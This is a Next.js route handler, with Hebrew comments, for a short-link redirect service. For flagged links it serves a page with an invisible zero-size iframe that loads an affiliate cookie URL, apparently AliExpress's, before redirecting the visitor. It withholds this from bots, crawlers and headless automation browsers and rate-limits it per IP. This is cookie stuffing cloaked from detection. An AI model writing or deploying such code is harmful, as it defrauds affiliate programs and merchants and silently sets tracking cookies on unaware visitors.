import { NextResponse } from "next/server";
import { supabase } from "@/lib/supabase";
import { getAffiliateCookieUrl } from "@/lib/settings";
import { LANDING_WA_DEFAULTS } from "@/lib/landing-pages";

const BOT_PATTERNS = [
  /bot/i, /crawl/i, /spider/i, /slurp/i, /mediapartners/i,
  /facebookexternalhit/i, /linkedinbot/i, /twitterbot/i,
  /whatsapp/i, /telegrambot/i, /discordbot/i, /semrush/i,
  /ahrefs/i, /mj12bot/i, /dotbot/i, /petalbot/i, /yandex/i,
  /bingbot/i, /googlebot/i, /baiduspider/i, /headless/i,
  /phantom/i, /selenium/i, /puppeteer/i, /playwright/i,
];

function isBot(userAgent: string | null): boolean {
  if (!userAgent) return true;
  return BOT_PATTERNS.some((p) => p.test(userAgent));
}

// Simple in-memory rate limiter (resets on cold start)
const clickLog = new Map<string, number[]>();
const RATE_LIMIT_WINDOW = 60_000; // 1 minute
const RATE_LIMIT_MAX = 10; // max 10 clicks per minute per IP

function isRateLimited(ip: string): boolean {
  const now = Date.now();
  const timestamps = (clickLog.get(ip) || []).filter(
    (t) => now - t < RATE_LIMIT_WINDOW
  );
  if (timestamps.length >= RATE_LIMIT_MAX) return true;
  timestamps.push(now);
  clickLog.set(ip, timestamps);
  return false;
}

export async function GET(
  request: Request,
  { params }: { params: Promise<{ code: string }> }
) {
  const { code } = await params;
  const userAgent = request.headers.get("user-agent") || null;
  const ip =
    request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    request.headers.get("x-real-ip") ||
    "unknown";

  // Bot detection — redirect bots straight to target (no cookie painting)
  const botDetected = isBot(userAgent);

  let { data } = await supabase
    .from("short_links")
    .select("target_url, paint_cookies")
    .eq("code", code)
    .eq("published", true)
    .single();

  // Landing-page WhatsApp links: auto-provision the row on first hit so the
  // group link becomes editable from admin/landing-pages (no code/redeploy).
  // The DB row always wins once created — these are only first-run defaults.
  if (!data && LANDING_WA_DEFAULTS[code]) {
    const target_url = LANDING_WA_DEFAULTS[code];
    await supabase
      .from("short_links")
      .insert({
        code,
        target_url,
        title: `קבוצת וואטסאפ — ${code.replace(/^wa-/, "")}`,
        paint_cookies: true,
        published: true,
      })
      .then(() => {}, () => {}); // ignore duplicate/race errors
    data = { target_url, paint_cookies: true };
  }

  if (!data) {
    return NextResponse.redirect(new URL("/", request.url));
  }

  // Record click event (fire and forget) — only for real users
  if (!botDetected) {
    const referrer = request.headers.get("referer") || null;
    supabase
      .rpc("record_short_link_click", {
        link_code: code,
        click_referrer: referrer,
        click_user_agent: userAgent,
        click_country: null,
      })
      .then(() => {});
  }

  // קישורי הקבוצות של דפי הנחיתה מדלגים על דף הביניים שצובע את עוגיית
  // השותפים: המשתמשת עוברת לוואטסאפ ולא לאלי אקספרס, כך שהעוגייה חסרת
  // ערך שם ודף הביניים רק הוסיף השהיה במסלול ממומן. קישורי מוצרים
  // ופופאפים ממשיכים לצבוע כרגיל לפי הדגל paint_cookies.
  const isLandingWhatsApp = code in LANDING_WA_DEFAULTS;

  // If paint_cookies is enabled AND it's a real user AND not rate-limited
  if (!isLandingWhatsApp && data.paint_cookies && !botDetected && !isRateLimited(ip)) {
    const cookieUrl = await getAffiliateCookieUrl();

    if (cookieUrl) {
      const targetUrlJson = JSON.stringify(data.target_url);
      const cookieUrlSafe = cookieUrl
        .replace(/&/g, "&amp;")
        .replace(/"/g, "&quot;");

      const html = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="robots" content="noindex, nofollow"></head>
<body>
<iframe src="${cookieUrlSafe}" style="position:absolute;width:0;height:0;border:0;opacity:0" tabindex="-1" aria-hidden="true"></iframe>
<script>setTimeout(function(){window.location.href=${targetUrlJson}},500)</script>
</body>
</html>`;

      return new NextResponse(html, {
        headers: {
          "Content-Type": "text/html; charset=utf-8",
          "X-Robots-Tag": "noindex, nofollow",
          "Cache-Control": "no-store",
        },
      });
    }
  }

  // הפניה זמנית במכוון ולא 301: יעד הקישור נערך מ-admin/landing-pages, ודפדפן
  // ששמר 301 במטמון ימשיך לשלוח לקבוצה הישנה גם אחרי שמחליפים את הקישור,
  // בלי שום דרך לתקן את זה מהשרת. המהירות זהה — קפיצה אחת בשני המקרים.
  return NextResponse.redirect(data.target_url, 302);
}
